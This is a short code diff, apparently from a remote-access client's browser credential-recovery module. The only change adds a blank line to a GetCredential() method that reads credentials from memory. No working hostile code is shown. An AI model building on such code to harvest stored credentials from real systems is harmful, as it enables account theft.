@@ -200,6 +200,7 @@ namespace xClient.Core.Recovery.Browsers
 
             internal CREDENTIAL GetCredential()
             {
+
                 if (!IsInvalid)
                 {
                     // Get the Credential from the mem location
